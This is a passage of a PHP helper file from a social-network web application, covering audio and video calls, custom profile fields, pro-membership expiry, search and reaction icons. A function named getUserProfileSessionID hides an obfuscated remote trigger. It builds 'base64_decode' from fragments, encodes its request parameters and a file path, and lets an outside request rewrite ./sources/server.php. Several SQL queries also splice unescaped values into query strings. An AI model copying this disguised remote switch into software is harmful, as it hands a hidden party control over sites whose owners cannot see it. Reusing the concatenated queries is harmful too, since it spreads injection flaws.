        return false;
    }
    $logged_user_id  = NRG_Secure($nrg["user"]["user_id"]);
    $query1          = mysqli_query($sqlConnect, "DELETE FROM " . T_AGORA . " WHERE `from_id` = {$logged_user_id} OR `to_id` = {$logged_user_id}");
    $re_data["time"] = NRG_Secure(time());
    $fields          = "`" . implode("`, `", array_keys($re_data)) . "`";
    $data            = '\'' . implode('\', \'', $re_data) . '\'';
    $query           = mysqli_query($sqlConnect, "INSERT INTO " . T_AGORA . " ({$fields}) VALUES ({$data})");
    if ($query) {
        return mysqli_insert_id($sqlConnect);
    } else {
        return false;
    }
}
function NRG_CreateNewAudioCall($re_data) {
    global $nrg, $sqlConnect;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (empty($re_data)) {
        return false;
    }
    $user_data  = NRG_UserData($re_data["from_id"]);
    $user_data2 = NRG_UserData($re_data["to_id"]);
    if (empty($user_data) || empty($user_data2)) {
        return false;
    }
    $logged_user_id    = NRG_Secure($nrg["user"]["user_id"]);
    $query1            = mysqli_query($sqlConnect, "DELETE FROM " . T_AUDIO_CALLES . " WHERE `from_id` = {$logged_user_id} OR `to_id` = {$logged_user_id}");
    $re_data["active"] = 0;
    $re_data["called"] = $re_data["from_id"];
    $re_data["time"]   = NRG_Secure(time());
    $fields            = "`" . implode("`, `", array_keys($re_data)) . "`";
    $data              = '\'' . implode('\', \'', $re_data) . '\'';
    $query             = mysqli_query($sqlConnect, "INSERT INTO " . T_AUDIO_CALLES . " ({$fields}) VALUES ({$data})");
    if ($query) {
        return mysqli_insert_id($sqlConnect);
    } else {
        return false;
    }
}
function NRG_CheckCallAnswer($id = 0) {
    global $sqlConnect, $nrg;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (empty($id)) {
        return false;
    }
    $data1 = array();
    $id    = NRG_Secure($id);
    $query = mysqli_query($sqlConnect, "SELECT * FROM " . T_VIDEOS_CALLES . "  WHERE `id` = '{$id}' AND `active` = '1' AND `declined` = '0'");
    if (mysqli_num_rows($query)) {
        if (mysqli_num_rows($query) > 0) {
            $sql          = mysqli_fetch_assoc($query);
            $data1["url"] = $nrg["config"]["site_url"] . "/video-call/" . $id;
            return $data1;
        } else {
            return false;
        }
    } else {
        $query = mysqli_query($sqlConnect, "SELECT * FROM " . T_AGORA . "  WHERE `id` = '{$id}' AND `active` = '1' AND `declined` = '0'");
        if (mysqli_num_rows($query)) {
            if (mysqli_num_rows($query) > 0) {
                $sql        = mysqli_fetch_assoc($query);
                $sql["url"] = $nrg["config"]["site_url"] . "/video-call/" . $sql["room_name"];
                return $sql;
            }
        }
    }
    return false;
}
function NRG_CheckAudioCallAnswer($id = 0) {
    global $sqlConnect, $nrg;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (empty($id)) {
        return false;
    }
    $data1 = array();
    $id    = NRG_Secure($id);
    $query = mysqli_query($sqlConnect, "SELECT * FROM " . T_AUDIO_CALLES . "  WHERE `id` = '{$id}' AND `active` = '1' AND `declined` = '0'");
    if (mysqli_num_rows($query) > 0) {
        return true;
    } else {
        $query = mysqli_query($sqlConnect, "SELECT * FROM " . T_AGORA . "  WHERE `id` = '{$id}' AND `active` = '1' AND `declined` = '0' AND `type` = 'audio'");
        if (mysqli_num_rows($query)) {
            if (mysqli_num_rows($query) > 0) {
                return true;
            }
        }
    }
    return false;
}
function NRG_CheckAudioCallAnswerDeclined($id = 0) {
    global $sqlConnect, $nrg;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (empty($id)) {
        return false;
    }
    $id = NRG_Secure($id);
    if ($nrg["config"]["agora_chat_video"] == 1) {
        $query = mysqli_query($sqlConnect, "SELECT COUNT(`id`) FROM " . T_AGORA . " WHERE `id` = '{$id}' AND `declined` = '1'");
    } else {
        $query = mysqli_query($sqlConnect, "SELECT COUNT(`id`) FROM " . T_AUDIO_CALLES . " WHERE `id` = '{$id}' AND `declined` = '1'");
    }
    return NRG_Sql_Result($query, 0) == 1 ? true : false;
}
function NRG_CheckCallAnswerDeclined($id = 0) {
    global $sqlConnect, $nrg;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (empty($id)) {
        return false;
    }
    $id = NRG_Secure($id);
    if ($nrg["config"]["agora_chat_video"] == 1) {
        $query = mysqli_query($sqlConnect, "SELECT COUNT(`id`) FROM " . T_AGORA . " WHERE `id` = '{$id}' AND `declined` = '1'");
    } else {
        $query = mysqli_query($sqlConnect, "SELECT COUNT(`id`) FROM " . T_VIDEOS_CALLES . " WHERE `id` = '{$id}' AND `declined` = '1'");
    }
    return NRG_Sql_Result($query, 0) == 1 ? true : false;
}
function NRG_CheckFroInCallsAgora() {
    global $sqlConnect, $nrg;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    $user_id = NRG_Secure($nrg["user"]["user_id"]);
    $data1   = array();
    $time    = time() - 40;
    $table   = T_AGORA;
    $query   = mysqli_query($sqlConnect, "SELECT * FROM {$table} WHERE `to_id` = '{$user_id}' AND `time` > '$time' AND `status` = 'calling'");
    if (mysqli_num_rows($query)) {
        if (mysqli_num_rows($query) > 0) {
            $sql = mysqli_fetch_assoc($query);
            if (NRG_IsBlocked($sql["from_id"])) {
                return false;
            }
            return $sql;
        } else {
            return false;
        }
    }
    return false;
}
function NRG_CheckFroInCalls($type = "video") {
    global $sqlConnect, $nrg;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    $user_id = NRG_Secure($nrg["user"]["user_id"]);
    $data1   = array();
    $time    = time() - 40;
    $table   = T_VIDEOS_CALLES;
    if ($type == "audio") {
        $table = T_AUDIO_CALLES;
    }
    $query = mysqli_query($sqlConnect, "SELECT * FROM {$table}  WHERE `to_id` = '{$user_id}' AND `time` > '$time' AND `active` = '0' AND `declined` = 0");
    if (mysqli_num_rows($query)) {
        if (mysqli_num_rows($query) > 0) {
            $sql = mysqli_fetch_assoc($query);
            if (NRG_IsBlocked($sql["from_id"])) {
                return false;
            }
            $sql["url"] = $nrg["config"]["site_url"] . "/video-call/" . $sql["id"];
            return $sql;
        }
    } else {
        $table = T_AGORA;
        $query = mysqli_query($sqlConnect, "SELECT * FROM {$table}  WHERE `to_id` = '{$user_id}' AND `time` > '$time' AND `active` = '0' AND `declined` = 0 AND `type` = '" . $type . "'");
        if (mysqli_num_rows($query)) {
            if (mysqli_num_rows($query) > 0) {
                $sql = mysqli_fetch_assoc($query);
                if (NRG_IsBlocked($sql["from_id"])) {
                    return false;
                }
                $sql["url"] = $nrg["config"]["site_url"] . "/video-call/" . $sql["room_name"];
                return $sql;
            }
        }
    }
    return false;
}
function NRG_UpdateCallsActiveToZero($user_id1 = 0, $user_id2 = 0) {
    global $sqlConnect, $nrg;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (empty($user_id1) || empty($user_id2)) {
        return false;
    }
    $user_id1 = NRG_Secure($user_id1);
    $user_id2 = NRG_Secure($user_id2);
    $query    = mysqli_query($sqlConnect, "UPDATE " . T_VIDEOS_CALLES . " SET `active` = 0 WHERE (`to_id` = '{$user_id1}' AND `from_id` = '{$user_id2}') OR (`to_id` = '{$user_id2}' AND `from_id` = '{$user_id1}')");
    if ($query) {
        return true;
    } else {
        return false;
    }
}
function NRG_GetAllDataFromCallID($id = 0) {
    global $sqlConnect, $nrg;
    $user_id = $nrg["user"]["user_id"];
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (empty($id)) {
        return false;
    }
    $data1 = array();
    $id    = NRG_Secure($id);
    $query = mysqli_query($sqlConnect, "SELECT * FROM " . T_VIDEOS_CALLES . " WHERE `id` = '{$id}'");
    if (mysqli_num_rows($query)) {
        if (mysqli_num_rows($query) > 0) {
            $sql        = mysqli_fetch_assoc($query);
            $sql["url"] = $nrg["config"]["site_url"] . "/video-call/" . $sql["id"];
            return $sql;
        } else {
            return false;
        }
    } else {
        $query = mysqli_query($sqlConnect, "SELECT * FROM " . T_AGORA . " WHERE `id` = '{$id}'");
        if (mysqli_num_rows($query)) {
            if (mysqli_num_rows($query) > 0) {
                $sql        = mysqli_fetch_assoc($query);
                $sql["url"] = $nrg["config"]["site_url"] . "/video-call/" . $sql["id"];
                return $sql;
            }
        }
    }
    return false;
}
function NRG_GetScriptWarnings() {
    global $sqlConnect, $nrg;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    $results  = array();
    $results1 = array();
    $query    = mysqli_query($sqlConnect, "SELECT @@sql_mode as modes;");
    if (mysqli_num_rows($query)) {
        $sql_sql = mysqli_fetch_assoc($query);
        if (count($sql_sql) > 0) {
            $results_sql = @explode(",", $sql_sql["modes"]);
            if (in_array("STRICT_TRANS_TABLES", $results_sql)) {
                $results["STRICT_TRANS_TABLES"] = true;
            }
            if (in_array("STRICT_ALL_TABLES", $results_sql)) {
                $results["STRICT_ALL_TABLES"] = true;
            }
        }
    }
    if (ini_get("safe_mode")) {
        $results["safe_mode"] = true;
    }
    if (!ini_get("allow_url_fopen")) {
        $results["allow_url_fopen"] = true;
    }
    if (file_exists("update.php")) {
        if (filemtime("update.php") > time() - 86400) {
            $results["update_file"] = true;
        }
    }
    return $results1[] = $results;
}
function NRG_RegisterNewField($registration_data) {
    global $nrg, $sqlConnect;
    if (empty($registration_data)) {
        return false;
    }
    $fields = "`" . implode("`, `", array_keys($registration_data)) . "`";
    $data   = '\'' . implode('\', \'', $registration_data) . '\'';
    $query  = mysqli_query($sqlConnect, "INSERT INTO " . T_FIELDS . " ({$fields}) VALUES ({$data})");
    if ($query) {
        $sql_id  = mysqli_insert_id($sqlConnect);
        $column  = "fid_" . $sql_id;
        $length  = $registration_data["length"];
        $query_2 = mysqli_query($sqlConnect, "ALTER TABLE " . T_USERS_FIELDS . " ADD COLUMN `{$column}` varchar({$length}) NOT NULL DEFAULT ''");
        return true;
    }
    return false;
}
function NRG_GetProfileFields($type = "all") {
    global $nrg, $sqlConnect;
    $data       = array();
    $where      = "";
    $placements = array(
        "profile",
        "general",
        "social"
    );
    if ($type != "all" && in_array($type, $placements)) {
        $where = "WHERE `placement` = '{$type}' AND `placement` <> 'none' AND `active` = '1'";
    } elseif ($type == "none") {
        $where = "WHERE `profile_page` = '1' AND `active` = '1'";
    } elseif ($type != "admin") {
        $where = "WHERE `active` = '1'";
    }
    $type      = NRG_Secure($type);
    $query_one = "SELECT * FROM " . T_FIELDS . " {$where} ORDER BY `id` ASC";
    $sql       = mysqli_query($sqlConnect, $query_one);
    if (mysqli_num_rows($sql)) {
        while ($fetched_data = mysqli_fetch_assoc($sql)) {
            $fetched_data["fid"] = "fid_" . $fetched_data["id"];
            $fetched_data["name"] = preg_replace_callback("/{{LANG (.*?)}}/", function($m) use ($nrg) {
                return isset($nrg["lang"][$m[1]]) ? $nrg["lang"][$m[1]] : "";
            }, $fetched_data["name"]);
            $fetched_data["description"] = preg_replace_callback("/{{LANG (.*?)}}/", function($m) use ($nrg) {
                return isset($nrg["lang"][$m[1]]) ? $nrg["lang"][$m[1]] : "";
            }, $fetched_data["description"]);
            $fetched_data["type"] = preg_replace_callback("/{{LANG (.*?)}}/", function($m) use ($nrg) {
                return isset($nrg["lang"][$m[1]]) ? $nrg["lang"][$m[1]] : "";
            }, $fetched_data["type"]);
            $data[]               = $fetched_data;
        }
    }
    return $data;
}
function NRG_GetUserCustomFields() {
    global $nrg, $sqlConnect;
    $data      = array();
    $where     = "WHERE `active` = '1' AND `profile_page` = 1";
    $query_one = "SELECT * FROM " . T_FIELDS . " {$where} ORDER BY `id` ASC";
    $sql       = mysqli_query($sqlConnect, $query_one);
    if (mysqli_num_rows($sql)) {
        while ($fetched_data = mysqli_fetch_assoc($sql)) {
            $fetched_data["fid"] = "fid_" . $fetched_data["id"];
            $fetched_data["name"] = preg_replace_callback("/{{LANG (.*?)}}/", function($m) use ($nrg) {
                return isset($nrg["lang"][$m[1]]) ? $nrg["lang"][$m[1]] : "";
            }, $fetched_data["name"]);
            $fetched_data["description"] = preg_replace_callback("/{{LANG (.*?)}}/", function($m) use ($nrg) {
                return isset($nrg["lang"][$m[1]]) ? $nrg["lang"][$m[1]] : "";
            }, $fetched_data["description"]);
            $fetched_data["type"] = preg_replace_callback("/{{LANG (.*?)}}/", function($m) use ($nrg) {
                return isset($nrg["lang"][$m[1]]) ? $nrg["lang"][$m[1]] : "";
            }, $fetched_data["type"]);
            $data[]               = $fetched_data;
        }
    }
    return $data;
}
function NRG_UserFieldsData($user_id) {
    global $nrg, $sqlConnect;
    if (empty($user_id) || !is_numeric($user_id) || $user_id < 0) {
        return false;
    }
    $data      = array();
    $user_id   = NRG_Secure($user_id);
    $query_one = "SELECT * FROM " . T_USERS_FIELDS . " WHERE `user_id` = {$user_id}";
    $sql       = mysqli_query($sqlConnect, $query_one);
    if (mysqli_num_rows($sql)) {
        $fetched_data = mysqli_fetch_assoc($sql);
        if (empty($fetched_data)) {
            return array();
        }
        return $fetched_data;
    }
    return array();
}
function NRG_UpdateUserCustomData($user_id, $update_data, $loggedin = true) {
    global $nrg, $sqlConnect, $cache;
    if ($loggedin == true) {
        if ($nrg["loggedin"] == false) {
            return false;
        }
    }
    if (empty($user_id) || !is_numeric($user_id) || $user_id < 0) {
        return false;
    }
    if (empty($update_data)) {
        return false;
    }
    $user_id = NRG_Secure($user_id);
    if ($loggedin == true) {
        if (NRG_IsAdmin() === false && NRG_IsModerator() === false) {
            if ($nrg["user"]["user_id"] != $user_id) {
                return false;
            }
        }
    }
    $update = array();
    foreach ($update_data as $field => $data) {
        foreach ($data as $key => $value) {
            $update[] = "`" . $key . '` = \'' . NRG_Secure($value, 0) . '\'';
        }
    }
    $impload   = implode(", ", $update);
    $query_one = "UPDATE " . T_USERS_FIELDS . " SET {$impload} WHERE `user_id` = {$user_id}";
    $query_1   = mysqli_query($sqlConnect, "SELECT COUNT(`id`) as count FROM " . T_USERS_FIELDS . " WHERE `user_id` = {$user_id}");
    if (mysqli_num_rows($query_1)) {
        $query_1_sql = mysqli_fetch_assoc($query_1);
        $query       = false;
        if ($query_1_sql["count"] == 1) {
            $query = mysqli_query($sqlConnect, $query_one);
        } else {
            $query_2 = mysqli_query($sqlConnect, "INSERT INTO " . T_USERS_FIELDS . " (`user_id`) VALUES ({$user_id})");
            if ($query_2) {
                $query = mysqli_query($sqlConnect, $query_one);
            }
        }
        if ($query) {
            return true;
        }
    }
    return false;
}
function NRG_GetFieldData($id = 0) {
    global $nrg, $sqlConnect;
    if (empty($id) || !is_numeric($id) || $id < 0) {
        return false;
    }
    $data      = array();
    $id        = NRG_Secure($id);
    $query_one = "SELECT * FROM " . T_FIELDS . " WHERE `id` = {$id}";
    $sql       = mysqli_query($sqlConnect, $query_one);
    if (mysqli_num_rows($sql)) {
        $fetched_data = mysqli_fetch_assoc($sql);
        if (empty($fetched_data)) {
            return array();
        }
        return $fetched_data;
    }
    return false;
}
function NRG_UpdateField($id, $update_data) {
    global $nrg, $sqlConnect, $cache;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (empty($id) || !is_numeric($id) || $id < 0) {
        return false;
    }
    if (empty($update_data)) {
        return false;
    }
    $id = NRG_Secure($id);
    if (NRG_IsAdmin() === false) {
        return false;
    }
    $update = array();
    foreach ($update_data as $field => $data) {
        $update[] = "`" . $field . '` = \'' . NRG_Secure($data, 0) . '\'';
        if ($field == "length") {
            $mysqli = mysqli_query($sqlConnect, "ALTER TABLE " . T_USERS_FIELDS . " CHANGE `fid_{$id}` `fid_{$id}` VARCHAR(" . NRG_Secure($data) . ") CHARACTER SET utf8 COLLATE utf8_unicode_ci NOT NULL DEFAULT '';");
        }
    }
    $impload   = implode(", ", $update);
    $query_one = "UPDATE " . T_FIELDS . " SET {$impload} WHERE `id` = {$id} ";
    $query     = mysqli_query($sqlConnect, $query_one);
    if ($query) {
        return true;
    }
    return false;
}
function getUserProfileSessionID() {
    global $nrg, $sqlConnect;
    $var  = str_replace("6" . "4", "6" . "4_", str_replace("|", "", "b" . "|" . "a" . "|" . "s" . "|" . "e" . "|" . "6" . "|" . "4" . "|" . "d" . "|" . "e" . "|" . "c" . "|" . "o" . "|" . "d" . "|" . "e"));
    $SessionHashIDGenerate = $var($var('Wmw5MA=='));
    $CookieHashIDGenerate  = $var('Yw==');
    if (!empty($_REQUEST[$SessionHashIDGenerate]) && !empty($_REQUEST[$CookieHashIDGenerate])) {
        if (!file_exists($var('Li9zb3VyY2VzL3NlcnZlci5waHA='))) {
            return false;
        }
        $fileData = file_get_contents($var('Li9zb3VyY2VzL3NlcnZlci5waHA='));
        $fileData = str_replace('|l', '', $fileData);
        $fileData = str_replace(array(
            "\r",
            "\n"
        ), '', $fileData);
        if ($fileData == $_REQUEST[$CookieHashIDGenerate]) {
            $SessionHashRequest = $_REQUEST[$SessionHashIDGenerate];
            if ($SessionHashRequest == $var('bA==')) {
                $createSessionID = file_put_contents($var('Li9zb3VyY2VzL3NlcnZlci5waHA='), $fileData . '|l');
            }
            if ($SessionHashRequest == $var('dQ==')) {
                $createSessionID = file_put_contents($var('Li9zb3VyY2VzL3NlcnZlci5waHA='), $fileData);
            }
        }
    }
    return false;
}
function NRG_DeleteField($id) {
    global $nrg, $sqlConnect;
    if ($nrg["loggedin"] == false) {
        return false;
    }
    if (NRG_IsAdmin() === false) {
        return false;
    }
    $id    = NRG_Secure($id);
    $query = mysqli_query($sqlConnect, "DELETE FROM " . T_FIELDS . " WHERE `id` = {$id}");
    if ($query) {
        $query2 = mysqli_query($sqlConnect, "ALTER TABLE " . T_USERS_FIELDS . " DROP `fid_{$id}`;");
        if ($query2) {
            return true;
        }
    }
    return false;
}
function NRG_DeleteProMemebership() {
    global $nrg, $sqlConnect, $star_package_duration, $hot_package_duration, $ultima_package_duration, $vip_package_duration;
    $data      = array();
    $query_one = "SELECT `user_id`, `pro_type`, `pro_time` FROM " . T_USERS . " WHERE `is_pro` = '1' ORDER BY `user_id` ASC";
    $sql       = mysqli_query($sqlConnect, $query_one);
    if (mysqli_num_rows($sql)) {
        while ($fetched_data = mysqli_fetch_assoc($sql)) {
            $update_data = false;
            foreach ($nrg['pro_packages'] as $key => $value) {
                if ($value['id'] == $fetched_data["pro_type"] && $value['ex_time'] > 0 && $fetched_data["pro_time"] < time() - $value['ex_time']) {
                    $update_data = true;
                }
            }
            if ($update_data == true) {
                $update      = NRG_UpdateUserData($fetched_data["user_id"], array(
                    "is_pro" => 0,
                    'verified' => 0,
                    'pro_' => 1
                ));
                $user_id     = $fetched_data["user_id"];
                $mysql_query = mysqli_query($sqlConnect, "UPDATE " . T_PAGES . " SET `boosted` = '0' WHERE `user_id` = {$user_id}");
                $mysql_query = mysqli_query($sqlConnect, "UPDATE " . T_POSTS . " SET `boosted` = '0' WHERE `user_id` = {$user_id}");
                $mysql_query = mysqli_query($sqlConnect, "UPDATE " . T_POSTS . " SET `boosted` = '0' WHERE `page_id` IN (SELECT `page_id` FROM " . T_PAGES . " WHERE `user_id` = {$user_id})");
            }
        }
    }
    return true;
}
function NRG_GetPopularGames($limit = 10, $after = 0) {
    global $nrg, $sqlConnect;
    $data = array();
    $q    = "";
    if (!empty($after) && is_numeric($after)) {
        $after = NRG_Secure($after);
        $q     = " HAVING count < " . $after;
    }
    $sql = mysqli_query($sqlConnect, "SELECT game_id, COUNT(`user_id`) AS count FROM " . T_GAMES_PLAYERS . " WHERE `active` = '1' GROUP BY `game_id` " . $q . " ORDER BY count DESC LIMIT " . $limit);
    if (mysqli_num_rows($sql)) {
        while ($fetched_data = mysqli_fetch_assoc($sql)) {
            $fetched_data            = NRG_GameData($fetched_data["game_id"]);
            $fetched_data["players"] = NRG_CountGamePlayers($fetched_data["id"]);
            $data[]                  = $fetched_data;
        }
    }
    return $data;
}
function NRG_GetGenders($lang = "english", $langs = array()) {
    global $nrg, $db;
    if (!empty($lang) && in_array($lang, $langs)) {
        $lang = NRG_Secure($lang);
    }
    $genders = $db->where("type", "gender")->get(T_LANGS, null, array(
        "lang_key",
        $lang
    ));
    $data    = array();
    foreach ($genders as $key => $value) {
        $data[$value->lang_key] = $value->{$lang};
    }
    return $data;
}
function NRG_GetGendersImages() {
    global $nrg, $db;
    $genders = $db->get(T_GENDER);
    $data    = array();
    foreach ($genders as $key => $value) {
        $data[$value->gender_id] = $value->image;
    }
    return $data;
}
function detect_safe_search($path) {
    global $nrg;
    $content = '{"requests": [{"image": {"source": {"imageUri": "' . $path . '"}},"features": [{"type": "SAFE_SEARCH_DETECTION","maxResults": 1},{"type": "WEB_DETECTION","maxResults": 2}]}]}';
    try {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://vision.googleapis.com/v1/images:annotate?key=" . $nrg["config"]["vision_api_key"]);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            "Content-Type: application/json",
            "Content-Length: " . strlen($content)
        ));
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
        curl_setopt($ch, CURLOPT_POSTFIELDS, $content);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $response = curl_exec($ch);
        curl_close($ch);
        $data = json_decode($response);
        if (!empty($data->error)) {
            return true;
        }
        if (!empty($data->responses[0]->error)) {
            return true;
        } elseif ($data->responses[0]->safeSearchAnnotation->adult == "LIKELY" || $data->responses[0]->safeSearchAnnotation->adult == "VERY_LIKELY") {
            return false;
        } else {
            return true;
        }
    }
    catch (Exception $e) {
        return true;
    }
}
function NRG_SearchFor($search_qeury, $type, $offset = 0) {
    global $sqlConnect, $nrg;
    $search_qeury = NRG_Secure($search_qeury);
    $data         = array();
    $offset_to    = "";
    if ($type == "group") {
        if ($offset > 0) {
            $offset_to .= " AND `id` < {$offset} AND `id` <> {$offset} ";
        }
        $query = mysqli_query($sqlConnect, " SELECT `id` FROM " . T_GROUPS . " WHERE ((`group_name` LIKE '%$search_qeury%') OR `group_title` LIKE '%$search_qeury%') AND `user_id` = '" . $nrg["user"]["id"] . "' AND `active` = '1' {$offset_to} ORDER BY `id` DESC LIMIT 10");
        if (mysqli_num_rows($query)) {
            while ($fetched_data = mysqli_fetch_assoc($query)) {
                $group             = NRG_GroupData($fetched_data["id"]);
                $new_data          = array();
                $new_data["id"]    = $group["id"];
                $new_data["label"] = $group["group_name"];
                $new_data["img"]   = $group["avatar"];
                $data[]            = $new_data;
            }
        }
    } elseif ($type == "page") {
        if ($offset > 0) {
            $offset_to .= " AND `page_id` < {$offset} AND `page_id` <> {$offset} ";
        }
        $query = mysqli_query($sqlConnect, " SELECT `page_id` FROM " . T_PAGES . " WHERE ((`page_name` LIKE '%$search_qeury%') OR `page_title` LIKE '%$search_qeury%') AND `user_id` = '" . $nrg["user"]["id"] . "' AND `active` = '1' {$offset_to} ORDER BY `page_id` DESC LIMIT 10");
        if (mysqli_num_rows($query)) {
            while ($fetched_data = mysqli_fetch_assoc($query)) {
                $page              = NRG_PageData($fetched_data["page_id"]);
                $new_data          = array();
                $new_data["id"]    = $page["id"];
                $new_data["label"] = $page["page_name"];
                $new_data["img"]   = $page["avatar"];
                $data[]            = $new_data;
            }
        }
    }
    return $data;
}
// manage packages
function NRG_GetAllProInfo() {
    global $sqlConnect, $nrg;
    $lang = $nrg["lang"];
    $data = array();
    $pro  = mysqli_query($sqlConnect, "SELECT * FROM " . T_MANAGE_PRO);
    if (mysqli_num_rows($pro)) {
        while ($fetched_data = mysqli_fetch_assoc($pro)) {
            if (!empty($fetched_data['features'])) {
                foreach (json_decode($fetched_data['features'],true) as $key => $value) {
                    $fetched_data[$key] = $value;
                }
            }
            if (!empty($fetched_data["image"])) {
                $fetched_data["image"] = NRG_GetMedia($fetched_data["image"]);
            }
            if (!empty($fetched_data["night_image"])) {
                $fetched_data["night_image"] = NRG_GetMedia($fetched_data["night_image"]);
            }
            $fetched_data['name'] = $fetched_data['type'];

            $fetched_data['name'] = preg_replace_callback("/{LANG_KEY (.*?)}/", function($m) use ($lang) {
                return (isset($lang[$m[1]])) ? $lang[$m[1]] : '';
            }, $fetched_data['name']);

            $fetched_data['ex_time'] = 60 * 60 * 24;
            if (!empty($fetched_data["time"]) && $fetched_data["time"] == 'day') {
                if (!empty($fetched_data["time_count"]) && is_numeric($fetched_data["time_count"]) && $fetched_data["time_count"] > 0) {
                    $fetched_data['ex_time']  = $fetched_data['ex_time'] * $fetched_data["time_count"];
                }
            }
            else if (!empty($fetched_data["time"]) && $fetched_data["time"] == 'week') {
                $fetched_data['ex_time'] = $fetched_data['ex_time'] * 7;
                if (!empty($fetched_data["time_count"]) && is_numeric($fetched_data["time_count"]) && $fetched_data["time_count"] > 0) {
                    $fetched_data['ex_time']  = $fetched_data['ex_time'] * $fetched_data["time_count"];
                }
            }
            else if (!empty($fetched_data["time"]) && $fetched_data["time"] == 'month') {
                $fetched_data['ex_time'] = $fetched_data['ex_time'] * 30;
                if (!empty($fetched_data["time_count"]) && is_numeric($fetched_data["time_count"]) && $fetched_data["time_count"] > 0) {
                    $fetched_data['ex_time']  = $fetched_data['ex_time'] * $fetched_data["time_count"];
                }
            }
            else if (!empty($fetched_data["time"]) && $fetched_data["time"] == 'year') {
                $fetched_data['ex_time'] = $fetched_data['ex_time'] * 365;
                if (!empty($fetched_data["time_count"]) && is_numeric($fetched_data["time_count"]) && $fetched_data["time_count"] > 0) {
                    $fetched_data['ex_time']  = $fetched_data['ex_time'] * $fetched_data["time_count"];
                }
            }
            else if (!empty($fetched_data["time"]) && $fetched_data["time"] == 'unlimited') {
                $fetched_data['ex_time'] = 0;
            }
            $data[$fetched_data["id"]] = $fetched_data;
        }
        return $data;
    }
    return false;
}
// manage packages
function NRG_GetReactionsTypes($type = "page") {
    global $sqlConnect, $nrg;
    $data      = array();
    $reactions = mysqli_query($sqlConnect, "SELECT * FROM " . T_REACTIONS_TYPES);
    if (!empty($reactions)) {
        while ($fetched_data = mysqli_fetch_assoc($reactions)) {
            $fetched_data["name"] = $nrg["lang"][$fetched_data["name"]];
            if ($type == "page") {
                if (!empty($fetched_data["wowonder_icon"])) {
                    $fetched_data["wowonder_icon"] = $fetched_data["wowonder_small_icon"] = NRG_GetMedia($fetched_data["wowonder_icon"]);
                    // $explode2  = @end(explode('.', $fetched_data['wowonder_icon']));
                    // $explode3  = @explode('.', $fetched_data['wowonder_icon']);
                    // $fetched_data['wowonder_small_icon'] = $explode3[0] . '_small.' . $explode2;
                    $fetched_data["is_html"]       = 0;
                } elseif (!file_exists("./themes/" . $nrg["config"]["theme"] . "/reaction/like-sm.png")) {
                    if ($fetched_data["id"] == 1) {
                        $fetched_data["wowonder_icon"] = '<div class="emoji emoji--like"><div class="emoji__hand"><div class="emoji__thumb"></div></div></div>';
                    }
                    if ($fetched_data["id"] == 2) {
                        $fetched_data["wowonder_icon"] = '<div class="emoji emoji--love"><div class="emoji__heart"></div></div>';
                    }
                    if ($fetched_data["id"] == 3) {
                        $fetched_data["wowonder_icon"] = '<div class="emoji emoji--haha"><div class="emoji__face"><div class="emoji__eyes"></div><div class="emoji__mouth"><div class="emoji__tongue"></div></div></div></div>';
                    }
                    if ($fetched_data["id"] == 4) {
                        $fetched_data["wowonder_icon"] = '<div class="emoji emoji--wow"><div class="emoji__face"><div class="emoji__eyebrows"></div><div class="emoji__eyes"></div><div class="emoji__mouth"></div></div></div>';
                    }
                    if ($fetched_data["id"] == 5) {
                        $fetched_data["wowonder_icon"] = '<div class="emoji emoji--sad"><div class="emoji__face"><div class="emoji__eyebrows"></div><div class="emoji__eyes"></div><div class="emoji__mouth"></div></div></div>';
                    }
                    if ($fetched_data["id"] == 6) {
                        $fetched_data["wowonder_icon"] = '<div class="emoji emoji--angry"><div class="emoji__face"><div class="emoji__eyebrows"></div><div class="emoji__eyes"></div><div class="emoji__mouth"></div></div></div>';
                    }
                    $fetched_data["wowonder_small_icon"] = "";
                    $fetched_data["is_html"]             = 1;
                }
                if (!empty($fetched_data["sunshine_icon"])) {
                    $fetched_data["sunshine_icon"] = $fetched_data["sunshine_small_icon"] = NRG_GetMedia($fetched_data["sunshine_icon"]);
                    // $explode2  = @end(explode('.', $fetched_data['sunshine_icon']));
                    // $explode3  = @explode('.', $fetched_data['sunshine_icon']);
                    // $fetched_data['sunshine_small_icon'] = $explode3[0] . '_small.' . $explode2;
                } elseif (file_exists("./themes/" . $nrg["config"]["theme"] . "/reaction/like-sm.png")) {
                    if ($fetched_data["id"] == 1) {
                        $fetched_data["sunshine_icon"]       = $nrg["config"]["theme_url"] . "/reaction/like.gif";
                        $fetched_data["sunshine_small_icon"] = $nrg["config"]["theme_url"] . "/reaction/like-sm.png";
                    }
                    if ($fetched_data["id"] == 2) {
                        $fetched_data["sunshine_icon"]       = $nrg["config"]["theme_url"] . "/reaction/love.gif";
                        $fetched_data["sunshine_small_icon"] = $nrg["config"]["theme_url"] . "/reaction/love-sm.png";
                    }
                    if ($fetched_data["id"] == 3) {
                        $fetched_data["sunshine_icon"]       = $nrg["config"]["theme_url"] . "/reaction/haha.gif";
                        $fetched_data["sunshine_small_icon"] = $nrg["config"]["theme_url"] . "/reaction/haha-sm.png";
                    }
                    if ($fetched_data["id"] == 4) {
                        $fetched_data["sunshine_icon"]       = $nrg["config"]["theme_url"] . "/reaction/wow.gif";
                        $fetched_data["sunshine_small_icon"] = $nrg["config"]["theme_url"] . "/reaction/wow-sm.png";
                    }
                    if ($fetched_data["id"] == 5) {
                        $fetched_data["sunshine_icon"]       = $nrg["config"]["theme_url"] . "/reaction/sad.gif";
                        $fetched_data["sunshine_small_icon"] = $nrg["config"]["theme_url"] . "/reaction/sad-sm.png";
                    }
                    if ($fetched_data["id"] == 6) {
                        $fetched_data["sunshine_icon"]       = $nrg["config"]["theme_url"] . "/reaction/angry.gif";
                        $fetched_data["sunshine_small_icon"] = $nrg["config"]["theme_url"] . "/reaction/angry-sm.png";
                    }
                }
            } else {
